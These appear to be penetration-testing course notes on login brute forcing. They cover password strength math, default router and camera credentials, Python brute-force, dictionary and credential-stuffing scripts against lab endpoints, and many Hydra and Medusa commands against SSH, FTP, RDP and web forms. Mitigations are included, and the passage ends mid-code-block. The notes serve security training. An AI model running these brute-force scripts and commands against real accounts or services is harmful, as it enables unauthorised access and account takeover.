# Login Brute Forcing

# Intro

Brute forcing is a trial-and-error method used in cybersecurity to crack passwords, login credentials, or encryption keys. It systematically tries every possible combination until the correct one is found. The process is akin to a thief trying every key on a keyring until the right one opens the door.

### Factors Influencing Brute Force Success:

1. **Password Complexity**: Longer passwords with a mix of uppercase, lowercase, numbers, and symbols are harder to crack.
2. **Computational Power**: Modern hardware can try billions of combinations per second.
3. **Security Measures**: Defenses like account lockouts and CAPTCHAs can thwart brute force attempts.

## How Brute Forcing Works

1. **Start**: Attacker initiates the process using specialized software.
2. **Generate Possible Combination**: Software generates a potential password/key.
3. **Apply Combination**: The combination is tested against the target system.
4. **Check if Successful**: If it matches, access is granted; otherwise, repeat.
5. **Access Granted**: Unauthorized access is achieved.
6. **End**: The process continues until the correct combination is found or the attacker gives up.

## Types of Brute Forcing

| Method | Description | Example | Best Used When... |
| --- | --- | --- | --- |
| **Simple Brute Force** | Systematically tries all combinations of characters within a defined set and range. | Trying all lowercase letters for a 4-6 character password. | No prior information is available, and computational resources are abundant. |
| **Dictionary Attack** | Uses pre-compiled lists of common words, phrases, and passwords. | Using 'rockyou.txt' to test login forms. | The target uses weak or easily guessable passwords. |
| **Hybrid Attack** | Combines dictionary attacks with character modifications. | Appending numbers to dictionary words. | The target might use a slightly modified common password. |
| **Credential Stuffing** | Leverages leaked credentials to access other services. | Using breached credentials to log in. | Users are suspected of reusing passwords across services. |
| **Password Spraying** | Tests a few common passwords across many usernames. | Testing 'password123' on all accounts. | Account lockout policies exist; attacker spreads attempts. |
| **Rainbow Table Attack** | Uses pre-computed hash tables to reverse hashes into plaintext passwords. | Comparing hashes to a pre-computed table. | A large set of password hashes needs cracking. |
| **Reverse Brute Force** | Tests a single password across multiple usernames. | Testing a leaked password across accounts. | A specific password is suspected to be reused widely. |
| **Distributed Brute Force** | Splits workload across multiple devices to increase speed. | Using a cluster for faster attacks. | Target password/key is highly complex; a single machine is insufficient. |

# Password Security Fundamentals

### The Importance of Strong Passwords

Passwords are the cornerstone of digital security, protecting sensitive systems and data. Strong passwords:

- Act as robust barriers against brute force and other attacks.
- Increase the time and resources required for a successful attack exponentially.

### Anatomy of a Strong Password (NIST Guidelines)

1. **Length**:
    - Minimum of 12 characters; longer passwords are exponentially harder to crack.
    - Example:
        - A 6-character password using only lowercase letters has 26^6 (~300M) combinations.
        - An 8-character password has 26^8 (~200B) combinations.
2. **Complexity**:
    - Include uppercase, lowercase, numbers, and symbols to expand the pool of potential characters.
3. **Uniqueness**:
    - Use unique passwords for every account to compartmentalize potential breaches.
4. **Randomness**:
    - Avoid using dictionary words, personal details, or common patterns.

## Common Password Weaknesses

Despite their importance, many users still choose weak passwords. Common pitfalls include:

- **Short Passwords**: Vulnerable due to fewer combinations.
- **Common Words and Phrases**: Easily cracked with dictionary attacks.
- **Personal Information**: Publicly available details (e.g., birthdays, pet names) make guessing easy.
- **Reused Passwords**: One compromised account can endanger others.
- **Predictable Patterns**: Sequences like "123456", "qwerty", or simple substitutions like "p@ssw0rd" are well-known.

## Password Policies

Organizations enforce password policies to improve security by requiring:

1. **Minimum Length**: Ensure passwords meet a baseline complexity.
2. **Character Requirements**: Require a mix of letters, numbers, and symbols.
3. **Password Expiration**: Enforce regular password updates.
4. **Password History**: Prevent reuse of recent passwords.

### Balancing Security and Usability

Overly stringent policies can frustrate users, leading to poor practices like writing passwords down. Effective policies should balance security with usability.

## The Perils of Default Credentials

Default usernames and passwords are significant vulnerabilities.

- They are often simple, widely known, and easy to exploit.
- Attackers use pre-compiled lists of default credentials for automated attacks.

### Examples of Default Credentials

| **Device/Manufacturer** | **Default Username** | **Default Password** | **Device Type** |
| --- | --- | --- | --- |
| Linksys Router | admin | admin | Wireless Router |
| D-Link Router | admin | admin | Wireless Router |
| Netgear Router | admin | password | Wireless Router |
| TP-Link Router | admin | admin | Wireless Router |
| Cisco Router | cisco | cisco | Network Router |
| Asus Router | admin | admin | Wireless Router |
| Belkin Router | admin | password | Wireless Router |
| Zyxel Router | admin | 1234 | Wireless Router |
| Samsung SmartCam | admin | 4321 | IP Camera |
| Hikvision DVR | admin | 12345 | Digital Video Recorder (DVR) |
| Axis IP Camera | root | pass | IP Camera |
| Ubiquiti UniFi AP | ubnt | ubnt | Wireless Access Point |
| Canon Printer | admin | admin | Network Printer |
| Honeywell Thermostat | admin | 1234 | Smart Thermostat |
| Panasonic DVR | admin | 12345 | Digital Video Recorder (DVR) |

Retaining default usernames even after changing passwords provides attackers with a predictable starting point.

## Brute-Forcing and Password Security

### Role of Password Strength in Brute-Force Scenarios

- Weak passwords are akin to weak locks; strong passwords act as vaults.
- Complexity influences the attacker's methods and tools.

### Key Insights for Penetration Testers

1. **Evaluating Vulnerabilities**: Assess password policies and likelihood of weak passwords.
2. **Strategic Tool Selection**: Use dictionary attacks for weak passwords; hybrids for stronger ones.
3. **Resource Allocation**: Estimate time and resources based on password complexity.
4. **Exploiting Weaknesses**: Default credentials often provide the easiest entry points.

Understanding password security is critical for both attackers and defenders. For penetration testers, it aids in planning and execution. For organizations, it emphasizes the importance of robust practices to safeguard sensitive data.

# Brute Force Attacks

## Understanding Brute Force Mathematics

Brute forcing relies on systematically attempting all possible password combinations. The total number of combinations can be calculated using the following formula:

```
Possible Combinations = Character Set Size^Password Length
```

### Example Calculations

- **6-character password** (lowercase letters only):
    - `26^6 ≈ 308,915,776` combinations
- **8-character password** (lowercase letters only):
    - `26^8 ≈ 208,827,064,576` combinations
- **8-character password** (uppercase + lowercase):
    - `52^8 ≈ 53,459,728,531,456` combinations
- **12-character password** (full ASCII set):
    - `94^12 ≈ 475,920,493,781,698,549,504` combinations

### Impact of Complexity

- **Longer passwords** dramatically increase the search space.
- **Adding character types** (e.g., numbers, symbols) exponentially expands the number of possible combinations.

### Computational Power and Cracking Time

- A **basic computer** cracking `1 million passwords/second` might take:
    - `6.92 years` to crack an 8-character password using letters and digits.
- A **supercomputer** capable of `1 trillion passwords/second` reduces this time significantly. However:
    - Cracking a 12-character password with all ASCII characters might still take `15,000 years`.

## Cracking a 4-Digit PIN (Demonstration)

The target system generates a random 4-digit PIN and exposes an endpoint `/pin`. A Python script can systematically brute-force this endpoint by trying all PINs from `0000` to `9999`.

### Python Brute Force Script

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Format number to 4-digits (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check for success and flag
    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

**How the Script Works**

- **Iterates** through all possible PINs (0000 to 9999).
- Sends a **GET request** to `/pin` with each PIN.
- If the server responds with the correct PIN and a **flag**, the attack stops.

**Example Output**

```bash
Attempted PIN: 4050
Attempted PIN: 4051
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
```

## Dictionary Attack

A dictionary attack exploits the human tendency to create passwords based on memorable words, common phrases, or predictable patterns. Instead of attempting every possible combination (as in brute force), a dictionary attack tests passwords from a pre-defined list (wordlist).

### Why It Works

- Many users prefer convenience over security, using weak, common passwords.
- Attackers leverage this predictability by using wordlists compiled from leaked passwords, dictionary words, and culturally relevant terms.
- A **tailored wordlist** (e.g., gaming terms, company names) can increase the likelihood of success.

## Brute Force vs. Dictionary Attacks

| Feature | Dictionary Attack | Brute Force Attack | Explanation |
| --- | --- | --- | --- |
| **Efficiency** | Fast, uses targeted wordlists | Time-consuming, tests all possible combinations | Pre-defined wordlists narrow the search space |
| **Targeting** | Customizable to target audience/systems | No specific targeting | Wordlists can reflect target-specific data |
| **Effectiveness** | Best against weak/common passwords | Guaranteed success (eventually) | Finds passwords quickly if they are common |
| **Limitations** | Ineffective against complex/random passwords | Impractical for highly complex passwords | Random passwords evade dictionary lists |

### Example Scenario

An attacker targeting employee logins might build a wordlist incorporating:

- **Common passwords** (e.g., "password123")
- **Company names and variations**
- **Employee names**
- **Industry-specific jargon**

## Building and Using Wordlists

| Wordlist | Description | Use Case | Source |
| --- | --- | --- | --- |
| **rockyou.txt** | Millions of leaked passwords from the RockYou breach | General password brute-forcing | RockYou breach |
| **top-usernames-shortlist.txt** | List of the most common usernames | Username brute-forcing | SecLists |
| **2023-200_most_used_passwords.txt** | Top 200 passwords used in 2023 | Targeting weak/reused passwords | SecLists |
| **default-passwords.txt** | Default credentials for devices and services | Testing default login credentials | SecLists |

### Wordlist Sources

- **Public Lists**: Freely available online (e.g., SecLists)
- **Custom Lists**: Created using reconnaissance (e.g., hobbies, target info)
- **Specialized Lists**: Tailored to industries or services
- **Pre-installed**: Comes with penetration testing tools (e.g., Kali Linux)

## Cracking Passwords with Dictionary Attacks (Python Demonstration)

A simple application generates a password-protected route `/dictionary` that checks for a correct password. The following Python script performs a dictionary attack by trying passwords from a downloaded wordlist.

**Python Dictionary Attack Script**

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a common password list from SecLists
passwords = requests.get("<https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt>").text.splitlines()

# Test each password
for password in passwords:
    print(f"Attempted password: {password}")

    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Success: Print the flag and stop
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

How the Script Works

1. **Download**: Fetches a list of 500 weak passwords from SecLists.
2. **Test**: Sends each password to the `/dictionary` route via a POST request.
3. **Check**: If the response includes a flag, the attack is successful.
4. **Stop**: The attack terminates after finding the correct password.

Example Output

```bash
Attempted password: 123456
Attempted password: qwerty
Correct password found: password123
Flag: HTB{...}
```

This script demonstrates the power of dictionary attacks and the vulnerability of weak passwords. It highlights the need for complex, unique passwords and defenses like rate limiting and account lockouts.

## Hybrid Attacks and Credential Stuffing

## What is a Hybrid Attack?

A hybrid attack blends the efficiency of dictionary attacks with the exhaustive nature of brute-force attacks. It leverages common passwords from a wordlist and appends or modifies them by adding numbers, symbols, or patterns to match typical user behavior.

### Why Hybrid Attacks Work

- **User Predictability**: Many users modify their passwords minimally (e.g., "Summer2023" → "Summer2024!").
- **Efficient Targeting**: Hybrid attacks reduce search space by focusing on variations of common passwords rather than random guesses.
- **Adaptability**: Attackers can tailor hybrid attacks to match organizational password policies or user tendencies.

## Hybrid Attacks in Action

![image.png](image%2099.png)

**Example Scenario**:

- A company enforces regular password changes.
- Users modify passwords by adding years or symbols (e.g., "Winter2023!").
- The attacker uses a dictionary attack and appends common variations to breach accounts.

### Command-Line Example: Filtering Wordlists for Password Policy Compliance

```bash
# Download a wordlist of common passwords
wget <https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt>

# Step 1: Filter passwords with at least 8 characters
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt

# Step 2: Ensure passwords contain at least one uppercase letter
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt

# Step 3: Ensure passwords contain at least one lowercase letter
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt

# Step 4: Ensure passwords contain at least one number
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt

# Count remaining passwords after filtering
wc -l darkweb2017-number.txt
```

**Result**:

- From a 10,000-password list, only **89** meet the organization's password policy.
- The filtered list represents a **highly targeted attack surface**, increasing efficiency and reducing computational effort.

## Credential Stuffing: Leveraging Stolen Data for Unauthorized Access

![image.png](image%20100.png)

Credential stuffing attacks leverage stolen usernames and passwords, testing them across multiple platforms to gain unauthorized access.

### How Credential Stuffing Works

1. **Acquire Credentials**: Attackers obtain leaked passwords from breaches (e.g., RockYou).
2. **Select Targets**: Focus on services where users may reuse credentials (e.g., banking, social media).
3. **Automated Testing**: Use scripts to test credentials at scale across different platforms.
4. **Gain Access**: Compromised accounts lead to data theft, identity fraud, and further exploitation.

### The Password Reuse Problem

- **Reusing Passwords**: When users repeat passwords across accounts, a breach on one service can compromise multiple accounts.
- **Impact**: Credential stuffing can lead to financial fraud, identity theft, and data leaks.

### Preventative Measures

- **Unique Passwords**: Use different passwords for every account.
- **Multi-Factor Authentication (MFA)**: Adds an extra layer of security.
- **Monitor for Breaches**: Services like Have I Been Pwned notify users of compromised credentials.

**Python Script Example for Credential Stuffing**

```python
import requests

ip = "127.0.0.1"  # Replace with target IP
port = 1234       # Replace with target port

credentials = [
    ('admin', 'password123'),
    ('user1', 'Welcome2023!'),
    ('john.doe', 'qwerty123'),
]

for username, password in credentials:
    response = requests.post(f"http://{ip}:{port}/login", data={'username': username, 'password': password})
    if response.ok and 'flag' in response.json():
        print(f"Successful login for {username} with password {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

# Hydra - Network Login Cracker

Hydra is a powerful and versatile network login cracker that can brute-force credentials across various protocols and services. Hydra excels in speed and flexibility, making it a preferred tool for penetration testers.

**Key Features**:

- **Speed and Efficiency**: Hydra uses parallel connections to accelerate login attempts.
- **Flexibility**: Supports numerous protocols and services (SSH, FTP, HTTP, RDP, etc.).
- **Ease of Use**: Simple command-line interface with clear syntax.

Hydra is typically pre-installed on penetration testing distributions (e.g., Kali Linux). To verify installation:

```bash
hydra -h
# if not installed
sudo apt-get -y update
sudo apt-get -y install hydra
```

**Basic Hydra Syntax**

```bash
hydra [login_options] [password_options] [attack_options] [service_options]
```

### Parameters Breakdown:

| **Parameter** | **Explanation** | **Usage Example** |
| --- | --- | --- |
| `-l LOGIN` or `-L FILE` | Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`). | `hydra -l admin ...` or `hydra -L usernames.txt ...` |
| `-p PASS` or `-P FILE` | Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`). | `hydra -p password123 ...` or `hydra -P passwords.txt ...` |
| `-t TASKS` | Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack. | `hydra -t 4 ...` |
| `-f` | Fast mode: Stop the attack after the first successful login is found. | `hydra -f ...` |
| `-s PORT` | Port: Specify a non-default port for the target service. | `hydra -s 2222 ...` |
| `-v` or `-V` | Verbose output: Display detailed information about the attack's progress, including attempts and results. | `hydra -v ...` or `hydra -V ...` (for even more verbosity) |
| `service://server` | Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname. | `hydra ssh://192.168.1.100` |
| `/OPT` | Service-specific options: Provide any additional options required by the target service. | `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication) |

## Common Hydra Services

| **Hydra Service** | **Service/Protocol** | **Description** | **Example Command** |
| --- | --- | --- | --- |
| ftp | File Transfer Protocol (FTP) | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100` |
| ssh | Secure Shell (SSH) | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems. | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100` |
| http-get/post | HTTP Web Services | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests. | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp | Simple Mail Transfer Protocol | Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails. | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com` |
| pop3 | Post Office Protocol (POP3) | Targets email retrieval services to brute-force credentials for POP3 login. | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com` |
| imap | Internet Message Access Protocol | Used to brute-force credentials for IMAP services, which allow users to access their email remotely. | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com` |
| mysql | MySQL Database | Attempts to brute-force login credentials for MySQL databases. | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100` |
| mssql | Microsoft SQL Server | Targets Microsoft SQL servers to brute-force database login credentials. | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100` |
| vnc | Virtual Network Computing (VNC) | Brute-forces VNC services, used for remote desktop access. | `hydra -P /path/to/password_list.txt vnc://192.168.1.100` |
| rdp | Remote Desktop Protocol (RDP) | Targets Microsoft RDP services for remote login brute-forcing. | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100` |

## Example Scenarios

**1. Brute-Forcing HTTP Authentication**

```bash
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

- Tests all combinations of `usernames.txt` and `passwords.txt` on the target web server.

---

**2. Targeting Multiple SSH Servers**

```bash
hydra -l root -p toor -M targets.txt ssh
```

- Uses `root` and password `toor` to brute-force multiple SSH servers listed in `targets.txt`.

---

**3. Testing FTP on Non-Standard Ports**

```bash
hydra -L usernames.txt -P passwords.txt -s 2121 ftp.example.com ftp
```

- Attacks an FTP service running on port `2121` with verbose output (`V`).

---

**4. Brute-Forcing Web Login Forms**

```bash
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

- Use the username "admin".
- Use the list of passwords from the `passwords.txt` file.
- Target the login form at `/login` on `www.example.com`.
- Employ the `http-post-form` module with the specified form parameters.
- Look for a successful login indicated by the HTTP status code `302`.

---

**5. RDP Brute-Force Attack**

```bash
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

- Use the username "administrator".
- Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
- Target the RDP service on `192.168.1.100`.
- Employ the `rdp` module for the attack.

---

Hydra's versatility allows penetration testers to adapt to various scenarios, making it an essential tool for brute-forcing services and identifying weak credentials.

# Basic HTTP Authentication and Hydra

Basic HTTP Authentication (Basic Auth) is a simple authentication method used by web servers to restrict access to protected resources. It prompts the user to enter credentials, which are then transmitted in each HTTP request.

**How Basic Auth Works**

1. **Initial Request**: User requests access to a restricted resource.
2. **Server Response**: Server returns `401 Unauthorized` with a `WWW-Authenticate` header.
3. **User Input**: Browser prompts the user for a username and password.
4. **Encoding**: The credentials are concatenated as `username:password`, Base64 encoded, and sent in the `Authorization` header:
    
    ```
    GET /protected_resource HTTP/1.1
    Host: www.example.com
    Authorization: Basic YWxpY2U6c2VjcmV0MTIz
    ```
    
5. **Server Verification**: The server decodes and verifies the credentials, granting or denying access.

---

### Exploiting Basic Auth with Hydra

In this scenario, we target a web server with Basic Auth enabled. The username is known (`basic-auth-user`), and we aim to brute-force the password using Hydra.

**Step 1: Download a Common Password List**

```bash
curl -s -O <https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt>
```

**Step 2: Run Hydra to Brute-Force Basic Auth**

```bash
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

# test multiple users
hydra -L users.txt -P passwords.txt http-get://83.136.252.221:32483/
```

### Command Breakdown

| Parameter | Description |
| --- | --- |
| `-l` | Specifies a single username (`basic-auth-user`). |
| `-P` | Uses the password list from `2023-200_most_used_passwords.txt`. |
| `127.0.0.1` | Target IP (localhost). |
| `http-get /` | Targets the HTTP service using GET requests at the root path `/`. |
| `-s 81` | Specifies port 81 (non-default HTTP port). |

**Example Output**

```bash
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200)
[DATA] attacking http-get://127.0.0.1:81/
[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
1 of 1 target successfully completed, 1 valid password found
```

---

## Why Basic Auth is Vulnerable

- **Base64 Encoding**: Credentials are only encoded, not encrypted, making them easy to decode if intercepted.
- **Lack of Session Management**: Credentials are sent with each request, increasing exposure.
- **No Rate Limiting**: Brute-force attacks like this can easily exploit Basic Auth without account lockouts.

---

## Mitigation Measures

- **Disable Basic Auth**: Use more secure authentication methods (e.g., OAuth, JWT).
- **Implement Rate Limiting**: Prevent excessive login attempts.
- **Enforce HTTPS**: Encrypt traffic to prevent credential interception.
- **Multi-Factor Authentication (MFA)**: Adds an extra layer of security.

# Brute-Forcing Login Forms with Hydra

Web applications often rely on login forms to secure access. These forms, while appearing simple, transmit sensitive credentials over HTTP POST requests, making them targets for brute-force attacks.

Hydra's **http-post-form** module automates login form brute-forcing by submitting POST requests with different username/password combinations.

---

### Anatomy of a Login Form

A typical login form looks like this:

```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>
```

Upon submission, the form sends:

```
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

---

### Hydra and Login Forms

Hydra can automate brute-force attempts against such login forms using the **http-post-form** service. This enables automated POST submissions.

**`Hydra Command Structure`**

```bash
hydra [options] target http-post-form "path:params:condition_string"
```

---

### Constructing the Attack

- **Target Path**: The path where the form submits data (`/login` or `/`).
- **Parameters**: `username` and `password` fields, dynamically replaced by Hydra.
- **Condition String**:
    - **F=...** – Specifies failure condition (e.g., "Invalid credentials").
        - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"`
    - **S=...** – Specifies success condition (e.g., "Dashboard" or HTTP 302).
        - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`

---

**Example: Brute-Forcing a Simple Login Form**

```bash
hydra -L usernames.txt -P passwords.txt IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

---

**Command Breakdown**

| Parameter | Description |
| --- | --- |
| `-L` | Use a list of usernames (`usernames.txt`). |
| `-P` | Use a list of passwords (`passwords.txt`). |
| `IP` | Target server's IP address. |
| `-s 5000` | Use port `5000`. |
| `http-post-form` | Instructs Hydra to perform POST-based form attack. |
| `/` | Target form path (`/`). |
| `username=^USER^&password=^PASS^` | Form fields populated by Hydra. |
| `F=Invalid credentials` | Marks failed logins. |

---

**Example Output**

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] attacking http-post-form://IP:5000/:username=^USER^&password=^PASS^:F=Invalid credentials
1 valid password found
```

---

## Gathering Information for Hydra

**`Methods:`**

1. **Manual Inspection:**
    - Right-click on the form → Inspect (View HTML).
    - Identify the `form action` (path) and `input name` fields (username/password).
2. **Browser Developer Tools:**
    - Open DevTools (F12) → Network tab.
    - Submit a test login to capture the exact POST request.
3. **Proxy Interception**:
    - Tools like **Burp Suite** intercept form submissions, allowing you to extract paths and parameters.

---

## Automating the Attack: Example Workflow

**`Step 1: Download Wordlists`**

```bash
curl -s -O <https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt>
curl -s -O <https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt>
```

**`Step 2: Hydra Command`**

```bash
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# // Real example:
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt -f 94.237.54.116 -s 59192 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

- Hydra iterates through username/password combinations.
- Successful attempts are flagged if the "Invalid credentials" message is **absent** in the response.

---

## Mitigation Measures

- **Implement Rate Limiting**: Limit login attempts per IP.
- **Enable CAPTCHA**: Adds a challenge to prevent automated attacks.
- **Monitor Logs**: Track and block suspicious login attempts.
- **Enforce Strong Password Policies**: Use complex, unique passwords for users.

---

# Medusa - Fast Login Brute-Forcer

Medusa is a parallel, modular login brute-forcer designed to assess remote authentication services. Its speed and flexibility make it a key tool for penetration testers.

```bash
medusa -h
# if not installed
sudo apt-get -y update
sudo apt-get -y install medusa
```

### Command Syntax and Parameter Table

```bash
medusa [target_options] [credential_options] -M module [module_options]
```

| **Parameter** | **Explanation** | **Usage Example** |
| --- | --- | --- |
| `-h HOST` or `-H FILE` | Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`). | `medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...` |
| `-u USERNAME` or `-U FILE` | Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`). | `medusa -u admin ...` or `medusa -U usernames.txt ...` |
| `-p PASSWORD` or `-P FILE` | Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`). | `medusa -p password123 ...` or `medusa -P passwords.txt ...` |
| `-M MODULE` | Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`). | `medusa -M ssh ...` |
| `-m "MODULE_OPTION"` | Module options: Provide additional parameters required by the chosen module, enclosed in quotes. | `medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...` |
| `-t TASKS` | Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack. | `medusa -t 4 ...` |
| `-f` or `-F` | Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`). | `medusa -f ...` or `medusa -F ...` |
| `-n PORT` | Port: Specify a non-default port for the target service. | `medusa -n 2222 ...` |
| `-v LEVEL` | Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output. | `medusa -v 4 ...` |

## Medusa Modules

| **Medusa Module** | **Service/Protocol** | **Description** | **Usage Example** |
| --- | --- | --- | --- |
| FTP | File Transfer Protocol | Brute-forcing FTP login credentials, used for file transfers over a network. | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt` |
| HTTP | Hypertext Transfer Protocol | Brute-forcing login forms on web applications over HTTP (GET/POST). | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| IMAP | Internet Message Access Protocol | Brute-forcing IMAP logins, often used to access email servers. | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt` |
| MySQL | MySQL Database | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt` |
| POP3 | Post Office Protocol 3 | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server. | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt` |
| RDP | Remote Desktop Protocol | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems. | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt` |
| SSHv2 | Secure Shell (SSH) | Brute-forcing SSH logins, commonly used for secure remote access. | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt` |
| Subversion (SVN) | Version Control System | Brute-forcing Subversion (SVN) repositories for version control. | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt` |
| Telnet | Telnet Protocol | Brute-forcing Telnet services for remote command execution on older systems. | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt` |
| VNC | Virtual Network Computing | Brute-forcing VNC login credentials for remote desktop access. | `medusa -M vnc -h 192.168.1.100 -P passwords.txt` |
| Web Form | Brute-forcing Web Login Forms | Brute-forcing login forms on websites using HTTP POST requests. | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"` |

## Example Scenarios

### 1. SSH Brute-Force Attack

```bash
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
```

- Target SSH server at `192.168.0.100` with user and password lists.

---

### 2. Multiple Web Server Brute-Force (HTTP Basic Auth)

```bash
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```

- Targets multiple servers using HTTP Basic Authentication.

---

### 3. Testing for Empty or Default Passwords

```bash
medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh
```

- Tests SSH server for empty passwords (`e n`) and username-password matches (`e s`).

---

## Mitigation Measures

- **Enable Multi-Factor Authentication (MFA).**
- **Implement Rate Limiting** to slow brute-force attempts.
- **Enforce Strong Password Policies.**
- **Monitor Login Attempts** and block suspicious IPs.

# Web Services - SSH and FTP Brute-Forcing with Medusa

This module demonstrates the practical use of **Medusa** to perform brute-force attacks on **SSH** and **FTP** services. The goal is to highlight potential vulnerabilities and the importance of strong authentication mechanisms.

---

## Targeting SSH Services

### SSH Brute-Force Attack

```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

**Command Breakdown:**

| Parameter | Description |
| --- | --- |
| `-h <IP>` | Target system's IP address. |
| `-n <PORT>` | SSH port (default: 22). |
| `-u sshuser` | Username for the attack. |
| `-P` | Wordlist of common passwords. |
| `-M ssh` | SSH module for Medusa. |
| `-t 3` | 3 parallel login attempts. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system. |

---

### Example Output

```bash
ACCOUNT FOUND: [ssh] Host: <IP> User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

Once the correct password is found, establish an SSH connection:

```bash
ssh sshuser@<IP> -p <PORT>
```

---

## Expanding the Attack Surface

### Identify Open Ports

```bash
netstat -tulpn | grep LISTEN
# example output
tcp6       0      0 :::21                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN

# Scan for services using nmap
nmap localhost
```

## Brute-Forcing FTP Services

### FTP Brute-Force Attack

(We are doing this locally on the TARGET machine)

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2023-200_most_used_passwords.txt -M ftp -t 5
# after we find the password we can again use locally to access it:
